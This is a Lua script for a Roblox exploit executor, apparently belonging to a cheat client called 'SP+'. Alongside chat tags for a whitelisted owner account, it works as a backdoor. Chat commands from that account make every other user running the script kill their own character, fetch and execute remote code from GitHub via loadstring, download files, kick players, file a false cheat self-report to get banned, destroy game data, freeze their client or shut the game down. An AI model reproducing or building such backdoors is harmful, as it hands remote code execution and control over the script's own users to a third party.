local textChatService = game:GetService("TextChatService")
local allowedplayers = {
    {name = "ggSnoopyConfigs", tag = 1 },
}

local chatTags = {
    [1] = {name = "SP+ OWNERðŸ¤ªðŸ¤ªðŸ¤‘ðŸ¤‘", color = Color3.fromRGB(137, 207, 240)},
    [2] = {name = "SP+ PRIVATE", color = Color3.fromRGB(137, 207, 240)},
    [3] = {name = "SP+ DEV", color = Color3.fromRGB(137, 207, 240)},
    [4] = {name = "SP+ ADMIN", color = Color3.fromRGB(137, 207, 240)},
}


local function getPlayerTag(playerName)
    for _, player in ipairs(allowedplayers) do
        if player.name == playerName then
            return player.tag
        end
    end
    return nil
end

local function isPlayerAllowed(playerName)
    return getPlayerTag(playerName) ~= nil
end

local commands = {

  kill = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
        end
    end,
    funnyvideo = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local filename = "bruh"
            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.IgnoreGuiInset = true
            ScreenGui.Parent = game:GetService("CoreGui")
            
            local video = Instance.new("VideoFrame")
            video.Size = UDim2.new(1, 0, 1, 0)
            video.Parent = ScreenGui
            
            local Name = filename .. ".mp4"
            if not isfile(Name) then
                writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
            end
            
            video.Video = syn and getsynasset(Name) or getcustomasset(Name)
            
            repeat
                task.wait()
                print("Retrying...")
            until video.Loaded
            
            video:Play()
        end
    end,
    reveal = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local textChatService = game:GetService("TextChatService")
            textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("SP+ On Top")
        end
    end,
    void = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local character = game.Players.LocalPlayer.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(0, -40, 0)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end,
    blind = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local blur = Instance.new("BlurEffect")
            blur.Size = 10000000000000
            blur.Parent = game.Lighting
        end
    end,
    unblind = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
            if blur then
                blur:Destroy()
            end
        end
    end,
    trollage = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
        end
    end,
    kick = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            wait(1)
            for index, player in pairs(game.Players:GetPlayers()) do
                player:Kick("Snoopy Owns You")
            end
        end
    end,
    ban = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local rs = game:GetService("ReplicatedStorage")
            local remote = rs:FindFirstChild("SelfReport", true)
            remote:FireServer("injection_detected")
        end
    end,
    rickroll = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
        end
    end,
    freeze = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
        end
    end,
    unfreeze = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
        end
    end,
    lobby = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
        end
    end,
    quit = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game:Shutdown()
        end
    end,
    lagback = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            for i = 1, 10 do
                wait()
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                local forwardVector = humanoidRootPart.CFrame.LookVector
                local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
                humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
            end
        end
    end,
    breakgame = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            pcall(function()
                local replicatedStorage = game:GetService("ReplicatedStorage")
                for _, child in ipairs(replicatedStorage:GetDescendants()) do
                    child:Destroy()
                end
            end)
        end
    end,
    funnymap = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local function unanchorParts(object)
                if object:IsA("BasePart") then
                    object.Anchored = false
                end
                for _, child in ipairs(object:GetChildren()) do
                    unanchorParts(child)
                end
            end
            unanchorParts(workspace)
        end
    end,
    crashclient = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            while true do
                wait()
            end
        end
    end,
    infping = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local thingy = settings().Network
            thingy.IncomingReplicationLag = math.huge
        end
    end
}

textChatService.OnIncomingMessage = function(message: TextChatMessage)
    local properties = Instance.new("TextChatMessageProperties")
    if message.TextSource then
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        local tag = getPlayerTag(player.Name)
        if tag then
            local tagData = chatTags[tag]
            local tagText = "[" .. tagData.name .. "]"
            local color = tagData.color
            properties.PrefixText = string.format("<font color='rgb(%d, %d, %d)'>%s</font> %s", color.R * 255, color.G * 255, color.B * 255, tagText, message.PrefixText)
        end
    end
    if message.TextSource then
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if isPlayerAllowed(player.Name) then
            local command = commands[message.Text]
            if command then
                command()
            end
        end
    end
    return properties
end
